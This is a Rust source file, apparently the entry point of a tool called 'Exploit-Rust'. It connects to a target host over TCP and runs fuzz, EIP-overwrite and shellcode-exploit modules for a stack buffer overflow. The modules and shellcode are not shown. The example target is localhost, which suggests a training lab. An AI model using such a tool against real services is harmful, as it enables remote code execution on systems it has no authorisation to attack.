use std::net::TcpStream;
use std::io;
use clap::Parser;
use serde::*;

mod interact;
mod fuzz;
mod overwrite_eip;
mod exploit;
mod parsers;

use crate::interact::interact;
use crate::fuzz::fuzz;
use crate::overwrite_eip::overwrite_eip;
use crate::exploit::exploit;
use crate::parsers::return_address_parser;

#[derive(
    clap::ValueEnum, Clone, Debug, Serialize,
)]
#[serde(rename_all = "kebab-case")]
enum Command {
    Interact,
    Fuzz,
    OverwriteEIP,
    Exploit
}

#[derive(Parser, Debug)]
#[command(name = "Exploit-Rust")]
#[command(version, about, long_about = "
   interact - sends a regular message
   fuzz - overflows the buffer with pattern 
   overwrite-ip - overwrites the instruction pointer with deadbeef value
   exploit - overflows the buffer and executes a shellcode")]
struct Args {
    #[arg(value_enum)]
    command: Command,
    #[arg(help = "in url format <ip:port>, e.g. 127.0.0.1:3000")]
    host: String,
    #[arg(value_parser = return_address_parser, help = "in hex format, e.g. ffff0010")]
    return_address: u32
}

fn main() -> io::Result<()> {
    let args = Args::parse();

    let mut stream = match TcpStream::connect(args.host) {
        Ok(stream) => stream,
        Err(e) => {
            eprintln!("Failed to connect to host: {}", e);
            return Err(e)
        }
    };

    use Command::*;
    let _result = match args.command {
        Interact => interact(&mut stream),
        Fuzz => fuzz(&mut stream),
        OverwriteEIP => overwrite_eip(&mut stream),
        Exploit => exploit(&mut stream, args.return_address),
    };
    Ok(())
}
